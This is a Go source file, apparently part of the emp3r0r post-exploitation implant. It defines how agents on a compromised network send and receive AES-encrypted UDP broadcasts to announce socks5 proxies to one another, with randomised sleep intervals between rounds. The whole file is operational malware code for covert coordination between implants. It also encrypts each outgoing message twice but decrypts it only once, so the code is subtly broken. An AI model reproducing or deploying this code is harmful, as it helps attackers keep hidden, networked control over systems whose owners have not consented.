package agent

import (
	"context"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/tun"
)

// BroadcastServer listen on a UDP port for broadcasts
// wait for some other agents to announce their internet proxy
func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error) {
	defer cancel()
	pc, err := net.ListenPacket("udp4", ":"+BroadcastPort)
	if err != nil {
		return
	}
	defer pc.Close()

	buf := make([]byte, 1024)

	// keep listening
	for ctx.Err() == nil {
		n, addr, err := pc.ReadFrom(buf)
		if err != nil {
			log.Printf("cannot read: %v", err)
			continue
		}

		// decrypt broadcast message
		decMsg := tun.AESDecrypt(AESKey, string(buf[:n]))
		if decMsg == "" {
			log.Printf("%x cannot be decrypted", buf[:n])
			continue
		}
		log.Printf("BroadcastServer: %s sent this: %s\n", addr, decMsg)
	}
	return
}

// BroadcastMsg send a broadcast message on a network
func BroadcastMsg(msg, dst string) (err error) {
	pc, err := net.ListenPacket("udp4", ":"+BroadcastPort)
	if err != nil {
		return
	}
	defer pc.Close()

	addr, err := net.ResolveUDPAddr("udp4", fmt.Sprintf("%s:%s", dst, BroadcastPort))
	if err != nil {
		return
	}

	// encrypt message
	encMsg := tun.AESEncrypt(AESKey, msg)
	if encMsg == "" {
		return fmt.Errorf("failed to encrypt %s", msg)
	}

	_, err = pc.WriteTo([]byte(encMsg), addr)
	return
}

func StartBroadcast(ctx context.Context, cancel context.CancelFunc) {
	defer cancel()
	proxyMsg := "socks5://127.0.0.1:1080"
	for ctx.Err() == nil {
		time.Sleep(time.Duration(RandInt(10, 120)) * time.Second)
		ips := tun.IPaddr()
		for _, ip := range ips {
			if ip.Broadcast == nil {
				continue
			}
			proxyMsg = fmt.Sprintf("socks5://%s:8388", ip.IP.String())
			encProxyMsg := tun.AESEncrypt(AESKey, proxyMsg)
			if encProxyMsg == "" {
				log.Printf("cannot encrypt %s", proxyMsg)
				continue
			}
			err := BroadcastMsg(encProxyMsg, ip.Broadcast.String())
			if err != nil {
				log.Print(err)
			}
		}
	}
}
